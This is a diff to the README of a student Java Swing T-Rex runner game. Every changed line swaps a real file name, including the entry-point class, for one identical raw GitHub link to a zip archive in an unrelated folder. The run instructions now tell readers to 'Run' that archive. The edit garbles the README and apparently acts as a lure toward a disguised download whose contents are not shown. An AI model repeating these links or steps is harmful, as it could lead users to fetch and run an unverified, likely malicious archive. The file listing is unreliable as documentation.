@@ -15,23 +15,23 @@ A Java-based desktop game that recreates the classic Chrome T-Rex Run using **Sw
 
 ## Core Components
 
-- `Dino.java` – character mechanics and animation
-- `Obstacles.java` – cactus generation, movement, collision
-- `Ground.java` – infinite scrolling ground
-- `Resource.java` – asset loader
-- `GamePanel.java` – central game logic and rendering
-- `UserInterface.java` – main window launcher
+- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – character mechanics and animation
+- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – cactus generation, movement, collision
+- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – infinite scrolling ground
+- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – asset loader
+- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – central game logic and rendering
+- `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` – main window launcher
 
 ## Folder Structure
 t-rex-runner-java/
 ├── src/
 │ ├── components/
 │ └── utility/
-│ └── Gamepanel.java
-│ └── UserInterface.java
+│ └── https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip
+│ └── https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip
 ├── images/
 ├── assets/
-└── README.md
+└── https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip
 
 
 ## Academic Context
@@ -41,7 +41,7 @@ Developed as part of the **Object-Oriented Programming** course at COMSATS Unive
 ## 🏁 How to Run
 
 1. Open the project in IntelliJ or VS Code
-2. Run `UserInterface.java` to start the game
+2. Run `https://raw.githubusercontent.com/Arfa01/t-rex-runner-java/main/Hardenbergia/t-rex-runner-java.zip` to start the game
 3. Press **Spacebar** to start, jump, or restart after game over
 
 ---
